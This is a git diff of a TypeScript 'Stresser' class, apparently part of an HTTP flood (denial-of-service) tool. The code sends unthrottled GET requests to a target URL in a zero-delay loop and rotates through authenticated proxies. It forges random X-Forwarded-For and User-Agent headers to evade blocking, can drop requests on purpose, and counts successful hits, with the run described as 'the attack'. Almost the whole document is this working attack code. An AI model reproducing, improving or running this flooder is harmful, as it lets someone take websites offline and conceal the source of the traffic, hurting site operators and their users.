@@ -16,248 +16,258 @@ import { Log } from '../types/Log';
 
 export class Stresser {
 
-   private targetURL: URL;
-   // ===== Agents =====
-   private httpAgent: http.Agent;
-   // ===== Proxies =====
-   private _proxyIndex: number = 0;
-   private get nextProxy(): KProxy {
-      return this.options.proxies[++this._proxyIndex % this.options.proxies.length];
-   }
-   // ===== Statistics =====
-   private stats = new Stats();
-   // ===== Options =====
-   private options: StresserOptions;
-   // ===== Constructor =====
-   constructor(options: StresserOptions) {
-      // set options
-      this.options = options;
-      // set target URL
-      this.targetURL = new URL(this.options.target);
-      // create http agent
-      this.httpAgent = new http.Agent(options.agent);
-      // start sending stats updates
-      setInterval(() => this.sendStatsUpdate(), this.options.updateInterval);
-      // handle errors
-      ['uncaughtException', 'unhandledRejection']
-         .forEach(code => process.on(code, (error: any) => process.send?.(Packet(PacketType.Error, error))));
-   }
+	private targetURL: URL;
+	// ===== Agents =====
+	private httpAgent: http.Agent;
+	// ===== Proxies =====
+	private _proxyIndex: number = 0;
+	private get nextProxy(): KProxy {
+		return this.options.proxies[++this._proxyIndex % this.options.proxies.length];
+	}
+	// ===== Statistics =====
+	private stats = new Stats();
+	// ===== Options =====
+	private options: StresserOptions;
+	// ===== Constructor =====
+	constructor(options: StresserOptions) {
+		// set options
+		this.options = options;
+		// set target URL
+		this.targetURL = new URL(this.options.target);
+		// create http agent
+		this.httpAgent = new http.Agent(options.agent);
+		// start sending stats updates
+		setInterval(() => this.sendStatsUpdate(), this.options.updateInterval);
+		// handle errors
+		['uncaughtException', 'unhandledRejection']
+			.forEach(code => process.on(code, (error: any) => process.send?.(Packet(PacketType.Error, error))));
+	}
 
-   // ========== Stressing ==========================================================================
+	// ========== Stressing ==========================================================================
 
-   /**
-    * Send a request to the target URL
-    * @param proxy The proxy to use for the request
-    */
-   private makeRequest_Beta(proxy?: KProxy) {
-      return new Promise<boolean | null>((resolve, reject) => {
-         try {
-            if (this.stats.pending >= this.options.maxPending) resolve(null);
+	/**
+	 * Send a request to the target URL
+	 * @param proxy The proxy to use for the request
+	 */
+	private async makeRequest(proxy?: KProxy) {
+		if (this.stats.pending >= this.options.maxPending) return null;
 
-            this.requestSent();
-            // create headers
-            let headers: http.OutgoingHttpHeaders = {
-               'X-Forwarded-For': faker.internet.ipv4(),
-               'User-Agent': faker.internet.userAgent(),
-               'Accept': '*/*',
-               'Accept-Language': 'en-US,en;q=0.5',
-               'Accept-Encoding': 'gzip, deflate, br',
-               'Referer': this.targetURL.hostname
-            };
-            // create options
-            let options: http.RequestOptions = {
-               method: 'GET',
-               hostname: this.targetURL.hostname,
-               port: this.targetURL.port,
-               path: this.targetURL.pathname + this.targetURL.search,
-               headers: headers,
-               agent: this.httpAgent,
-               timeout: 5000,
-               // ==========================================
-            };
-            // handle use of proxy
-            if (this.options.useProxies) {
-               if (!proxy) proxy = this.nextProxy;
-               // transfer target host to headers for proxy
-               headers['Host'] = `${options.hostname}:${options.port}`;
-               // use proxy for target host
-               options.hostname = proxy[0];
-               options.port = Number(proxy[1]);
-               // add proxy auth
-               if (proxy.length === 4) {
-                  let auth = Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64');
-                  headers['Proxy-Authorization'] = `Basic ${auth}`;
-               }
-            }
+		// create headers
+		let headers: { [key: string]: string } = {
+			'X-Forwarded-For': faker.internet.ipv4(),
+			'User-Agent': faker.internet.userAgent(),
+			'Accept': '*/*',
+			'Accept-Language': 'en-US,en;q=0.5',
+			'Accept-Encoding': 'gzip, deflate, br',
+			'Referer': this.targetURL.hostname
+		};
+		// create options
+		let options: Partial<AxiosRequestConfig> = {
+			method: 'GET',
+			url: this.targetURL.href,
+			headers: headers,
+			timeout: 5000
+		};
+		// use proxy
+		if (this.options.useProxies) {
+			if (!proxy) proxy = this.nextProxy;
+			options.proxy = {
+				protocol: 'http',
+				host: proxy[0],
+				port: Number(proxy[1]),
+				auth: proxy.length === 4 ? {
+					username: proxy[2],
+					password: proxy[3],
+				} : undefined,
+			};
+		};
 
-            const request = http.request(options, (response) => {
-               response.on('data', (chunk) => { });
-               response.once('end', () => resolve(this.requestCompleted(response.statusCode as HttpCode)));
-            });
+		this.requestSent();
 
-            request.once('error', () => resolve(this.requestError()));
-            // request.once('timeout', () => resolve(this.requestCompleted(false)));
+		const cancelToken = axios.CancelToken.source();
+		options.cancelToken = cancelToken.token;
 
-            request.end();
+		const result = axios(options)
+			.then(
+				(response) => {
+					// process.send?.(Packet(PacketType.Log, Log(LogType.Info, "completed")));
+					return (response)
+						? this.requestCompleted(response.status as HttpCode)
+						: this.requestError();
+				},
+				(error) => {
+					// process.send?.(Packet(PacketType.Log, Log(LogType.Info, error.message)));
+					return (error.response)
+						? this.requestCompleted(error.response.status as HttpCode)
+						: (axios.isCancel(error))
+							? this.requestDropped()
+							: this.requestError(error);
+				}
+			);
 
-            // if (!this.options.tracking) request.destroy();
-         } catch (error: any) {
-            process.send?.(Packet(PacketType.Error, error));
-            resolve(this.requestError());
-         }
-      });
-   }
+		if (this.options.dropRequests)
+			cancelToken.cancel();
 
-   /**
-    * Send a request to the target URL
-    * @param proxy The proxy to use for the request
-    */
-   private async makeRequest(proxy?: KProxy) {
-      if (this.stats.pending >= this.options.maxPending) return null;
+		return result;
+	}
 
-      // create headers
-      let headers: { [key: string]: string } = {
-         'X-Forwarded-For': faker.internet.ipv4(),
-         'User-Agent': faker.internet.userAgent(),
-         'Accept': '*/*',
-         'Accept-Language': 'en-US,en;q=0.5',
-         'Accept-Encoding': 'gzip, deflate, br',
-         'Referer': this.targetURL.hostname
-      };
-      // create options
-      let options: Partial<AxiosRequestConfig> = {
-         method: 'GET',
-         url: this.targetURL.href,
-         headers: headers,
-         timeout: 5000
-      };
-      // use proxy
-      if (this.options.useProxies) {
-         if (!proxy) proxy = this.nextProxy;
-         options.proxy = {
-            protocol: 'http',
-            host: proxy[0],
-            port: Number(proxy[1]),
-            auth: proxy.length === 4 ? {
-               username: proxy[2],
-               password: proxy[3],
-            } : undefined,
-         };
-      };
+	/**
+	 * Send a request to the target URL
+	 * @param proxy The proxy to use for the request
+	 */
+	private makeRequest_Beta(proxy?: KProxy) {
+		return new Promise<boolean | null>((resolve, reject) => {
+			try {
+				if (this.stats.pending >= this.options.maxPending) resolve(null);
 
-      this.requestSent();
+				this.requestSent();
+				// create headers
+				let headers: http.OutgoingHttpHeaders = {
+					'X-Forwarded-For': faker.internet.ipv4(),
+					'User-Agent': faker.internet.userAgent(),
+					'Accept': '*/*',
+					'Accept-Language': 'en-US,en;q=0.5',
+					'Accept-Encoding': 'gzip, deflate, br',
+					'Referer': this.targetURL.hostname
+				};
+				// create options
+				let options: http.RequestOptions = {
+					method: 'GET',
+					hostname: this.targetURL.hostname,
+					port: this.targetURL.port,
+					path: this.targetURL.pathname + this.targetURL.search,
+					headers: headers,
+					agent: this.httpAgent,
+					timeout: 5000,
+					// ==========================================
+				};
+				// handle use of proxy
+				if (this.options.useProxies) {
+					if (!proxy) proxy = this.nextProxy;
+					// transfer target host to headers for proxy
+					headers['Host'] = `${options.hostname}:${options.port}`;
+					// use proxy for target host
+					options.hostname = proxy[0];
+					options.port = Number(proxy[1]);
+					// add proxy auth
+					if (proxy.length === 4) {
+						let auth = Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64');
+						headers['Proxy-Authorization'] = `Basic ${auth}`;
+					}
+				}
 
-      const cancelToken = axios.CancelToken.source();
-      options.cancelToken = cancelToken.token;
+				const request = http.request(options, (response) => {
+					response.on('data', (chunk) => { });
+					response.once('end', () => resolve(this.requestCompleted(response.statusCode as HttpCode)));
+				});
 
-      const result = axios(options)
-         .then(
-            (response) => {
-               // process.send?.(Packet(PacketType.Log, Log(LogType.Info, "completed")));
-               return (response)
-                  ? this.requestCompleted(response.status as HttpCode)
-                  : this.requestError();
-            },
-            (error) => {
-               // process.send?.(Packet(PacketType.Log, Log(LogType.Info, error.message)));
-               return (error.response)
-                  ? this.requestCompleted(error.response.status as HttpCode)
-                  : (axios.isCancel(error))
-                     ? this.requestDropped()
-                     : this.requestError(error);
-            }
-         );
+				request.once('error', () => resolve(this.requestError()));
+				// request.once('timeout', () => resolve(this.requestCompleted(false)));
 
-      if (this.options.dropRequests)
-         cancelToken.cancel();
+				request.end();
 
-      return result;
-   }
+				// if (!this.options.tracking) request.destroy();
+			} catch (error: any) {
+				process.send?.(Packet(PacketType.Error, error));
+				resolve(this.requestError());
+			}
+		});
+	}
 
-   /**
-    * Stress the target URL for a specified duration
-    * @param duration The duration of the attack
-    * @param config The configuration to use for the requests
-    */
-   public async stress(duration: number) {
-      // send requests
-      this.tick_v1();
-      // this.tick_v2(Date.now() + duration * 1000);
-   }
+	/**
+	 * Stress the target URL for a specified duration
+	 * @param duration The duration of the attack
+	 * @param config The configuration to use for the requests
+	 */
+	public async stress(duration: number) {
+		// send requests
+		const intervalId = setInterval(() => {
+			for (let i = 0; i < this.options.multiplier; i++)
+				this.makeRequest();
+		}, 0);
+		// wait for the duration
+		await new Promise(resolve => setTimeout(resolve, duration * 1000));
+		// stop sending requests
+		clearInterval(intervalId);
+		// wait for pending requests to complete
+		// await new Promise<void>(resolve => {
+		// 	const intervalId = setInterval(() => {
+		// 		if (this.stats.pending === 0) {
+		// 			clearInterval(intervalId);
+		// 			resolve();
+		// 		}
+		// 	}, 0);
+		// });
+		// send stats update
+		this.sendStatsUpdate();
+	}
 
-   private tick_v1() {
-      setInterval(() => {
-         for (let i = 0; i < this.options.multiplier; i++)
-            this.makeRequest();
-      }, 0);
-   }
+	private tick_v2(stop: number, ticks: number = 0) {
+		if (Date.now() >= stop) return this.sendStatsUpdate();
 
-   private tick_v2(stop: number, ticks: number = 0) {
-      if (Date.now() >= stop) return this.sendStatsUpdate();
+		if (ticks === 10000)
+			ticks = 0, this.sendStatsUpdate();
 
-      if (ticks === 10000)
-         ticks = 0, this.sendStatsUpdate();
+		for (let i = 0; i < this.options.multiplier; i++)
+			this.makeRequest_Beta();
 
-      for (let i = 0; i < this.options.multiplier; i++)
-         this.makeRequest_Beta();
+		process.nextTick(() => this.tick_v2(stop, ticks + 1));
+	}
 
-      process.nextTick(() => this.tick_v2(stop, ticks + 1));
-   }
+	// ========== Proxies =============================================================================
 
-   // ========== Proxies =============================================================================
+	public async validateProxies(proxies: KProxy[]): Promise<KProxy[]> {
+		// validate proxies, and get an array of results (true/false)
+		let proxy_results = await Promise.all(
+			proxies.map(async (proxy) => await this.makeRequest(proxy))
+		);
+		process.send?.(Packet(PacketType.Log, Log(LogType.Info, `Validating proxies...`)));
+		// filter out invalid proxies
+		let valid_proxies = proxies.filter((proxy, index) => proxy_results[index]);
+		// return valid proxies
+		return valid_proxies;
+	}
 
-   public async validateProxies(proxies: KProxy[]): Promise<KProxy[]> {
-      // validate proxies, and get an array of results (true/false)
-      let proxy_results = await Promise.all(
-         proxies.map(async (proxy) => await this.makeRequest(proxy))
-      );
-      process.send?.(Packet(PacketType.Log, Log(LogType.Info, `Validating proxies...`)));
-      // filter out invalid proxies
-      let valid_proxies = proxies.filter((proxy, index) => proxy_results[index]);
-      // return valid proxies
-      return valid_proxies;
-   }
+	// ========== Statistics =========================================================================
 
-   // ========== Statistics =========================================================================
+	private requestSent() {
+		this.stats.requests++;
+		this.stats.pending++;
+	}
 
-   private requestSent() {
-      this.stats.requests++;
-      this.stats.pending++;
-   }
+	private requestError(error?: Error): false {
+		// process.send?.(Packet(PacketType.Log, Log(LogType.Info, `${error?.message}`)));
+		this.stats.pending--;
+		this.stats.errors++;
+		return false;
+	}
 
-   private requestError(error?: Error): false {
-      // process.send?.(Packet(PacketType.Log, Log(LogType.Info, `${error?.message}`)));
-      this.stats.pending--;
-      this.stats.errors++;
-      return false;
-   }
+	private requestDropped(): false {
+		this.stats.pending--;
+		this.stats.dropped++;
+		return false;
+	}
 
-   private requestDropped(): false {
-      this.stats.pending--;
-      this.stats.dropped++;
-      return false;
-   }
+	private requestCompleted(code: HttpCode): boolean {
+		this.stats.pending--;
+		this.stats.codes.register(code);
+		let success = (code === 200);
+		(success) ? this.stats.success++ : this.stats.fails++;
+		return success;
+	}
 
-   private requestCompleted(code: HttpCode): boolean {
-      this.stats.pending--;
-      this.stats.codes.register(code);
-      let success = (code === 200);
-      (success) ? this.stats.success++ : this.stats.fails++;
-      return success;
-   }
-
-   /**
-    * Send a stats update to the master process
-    */
-   private sendStatsUpdate() {
-      process.send?.(Packet(PacketType.Data, this.stats));
-   }
+	/**
+	 * Send a stats update to the master process
+	 */
+	private sendStatsUpdate() {
+		process.send?.(Packet(PacketType.Data, this.stats));
+	}
 
 }
 
 process.on('uncaughtException', (error) => {
-   throw error;
+	throw error;
 });
 process.on('unhandledRejection', (error) => {
-   throw error;
+	throw error;
 });
